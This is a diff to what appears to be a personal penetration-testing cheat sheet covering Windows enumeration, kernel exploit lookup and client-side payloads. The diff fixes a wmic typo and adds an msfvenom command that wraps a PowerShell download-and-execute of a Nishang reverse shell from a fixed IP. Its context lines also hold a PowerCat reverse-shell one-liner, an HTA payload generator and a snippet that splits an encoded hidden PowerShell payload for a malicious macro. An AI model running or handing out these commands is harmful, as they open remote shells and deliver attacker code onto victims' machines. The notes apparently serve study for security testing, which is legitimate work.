@@ -232,7 +232,7 @@ Windows Enumeration:
 -     systeminfo
 -     check the patches (HotFixes) --> wmic qfe
 -     list the drives ex. C: D: --> wimc logicaldisk
--     list the drives ex. C: D: --> wmic logicaldist get caption,description,providername
+-     list the drives ex. C: D: --> wmic logicaldisk get caption,description,providername
 - user enum and groups
 -     user that you are logged in with --> whoami
 -     check user privilege --> whoami /priv
@@ -278,6 +278,7 @@ Windows Enumeration:
   
 1- Escalation Path - Kernel Exploitation
 here is all kernel exploitation from GitHub: https://github.com/SecWiki/windows-kernel-exploits
+- run systeminfo command on the target system then user windows-exploit-suggester-python3 to find exploits.
 
 - Port Forwarding
 - - check the open ports in the machine
@@ -742,6 +743,8 @@ sudo fuser -k 443/tcp
 - encode the following PowerShell reverse shell
 -     IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
 -     msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o /home/raman/Desktop/payload.hta
+- nishang reverse powershell with bypassing the double quotes
+-     msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.9/Invoke-PowerShellTcp.ps1')\""
 - use the following function to split the payload
 -     str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." n = 50 for i in range(0, len(str), n): print("Str = Str + " + '"' + str[i:i+n] + '"')
 - paste the payload from the function in the macro
